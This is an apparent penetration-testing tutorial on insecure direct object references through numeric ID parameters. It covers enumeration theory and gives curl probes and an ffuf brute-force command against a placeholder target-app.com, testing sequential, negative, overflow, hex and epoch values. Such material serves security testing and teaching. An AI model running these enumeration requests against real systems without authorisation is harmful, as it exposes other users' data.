# Numeric Value Parameter

## Context

In web applications, vulnerabilities associated with numeric value parameters can lead to significant security risks if not properly controlled. Such vulnerabilities fall within the realm of Insecure Direct Object References (IDOR), where numeric identifiers are exploited to access unauthorized objects. This tutorial aims to demonstrate the techniques used to exploit these vulnerabilities by manipulating numeric value parameters. Assumed knowledge includes an understanding of numeric identifiers, basic parameter handling, access control mechanisms, and the broader concept of IDOR.

## Theory

### Numeric Value Parameters in Web Applications

Numeric value parameters are commonly used as identifiers within web applications. These identifiers are typically integer-based and are passed within URLs or HTTP requests, such as `id=123`. The simplicity and predictability of sequential numeric IDs make them convenient for development. However, they can also pose security risks when not adequately safeguarded, leading to potential unauthorized access to resources.

### Attack Surface: Numeric ID Enumeration

When numeric value parameters lack proper access control, they become susceptible to enumeration attacks. An attacker can increment or decrement the numeric IDs within the request to access resources not meant for them. By modifying these values strategically, attackers can reveal unauthorized objects or data.

The attack often starts by sending requests with known IDs and incrementally adjusting them to discover more accessible resources. Additionally, using edge-case values such as negative numbers or extremely large integers can reveal logic flaws or even bypass mechanisms.

### Variants of Numeric Parameters

Numeric parameters may not always be in a straightforward decimal format. Hexadecimal representations or epoch timestamps are also used in some applications. Understanding the different formats is crucial as they may process or validate differently in the backend. Identifying and manipulating these variants enable attackers to discover weaknesses in how an application handles and protects its resources.

## Practice

### Manual Numeric ID Enumeration and Exploitation

Manual exploitation involves directly manipulating numeric IDs to test an application's security controls. Follow these steps to manually enumerate and identify potential vulnerabilities:

- Use `curl` to make an initial request with a known numeric ID:

    ```bash
    curl -i 'https://target-app.com/resource?id=1'
    ```
    _Request resource with a known or guessed numeric ID._

- Increment the ID to test for unauthorized access:

    ```bash
    curl -i 'https://target-app.com/resource?id=2'
    ```
    _Increment ID to test for unauthorized access._

- Continue the increment to enumerate accessible objects:

    ```bash
    curl -i 'https://target-app.com/resource?id=3'
    ```
    _Continue incrementing to enumerate accessible objects._

- Test an edge-case value (zero):

    ```bash
    curl -i 'https://target-app.com/resource?id=0'
    ```
    _Test edge-case value (zero)._

- Test a negative value for logic flaws:

    ```bash
    curl -i 'https://target-app.com/resource?id=-1'
    ```
    _Test negative value for logic flaws._

- Test large integer for overflow or bypass attempts:

    ```bash
    curl -i 'https://target-app.com/resource?id=2147483647'
    ```
    _Test large integer for overflow or bypass._

- Test hexadecimal representation if accepted by the application:

    ```bash
    curl -i 'https://target-app.com/resource?id=0x10'
    ```
    _Test hexadecimal representation if accepted._

- Test epoch timestamp if you suspect that format is being used:

    ```bash
    curl -i 'https://target-app.com/resource?id=1672531200'
    ```
    _Test epoch timestamp if format is suspected._

Successful execution of these steps might allow access to sensitive data or resources not initially provisioned for unauthorized users.

### Automated Numeric ID Brute-force with ffuf

Automation can enhance the speed and efficiency of numeric ID enumeration. The following steps use `ffuf` to automate this process:

- Use `ffuf` to brute force numeric IDs using a wordlist of numbers:

    ```bash
    ffuf -u 'https://target-app.com/resource?id=FUZZ' -w /usr/share/wordlists/numbers.txt -mc 200
    ```
    _Automate numeric ID enumeration using a wordlist of numbers._

This automated technique can rapidly discover accessible resources through thorough numeric parameter fuzzing, potentially revealing unauthorized access to sensitive data.
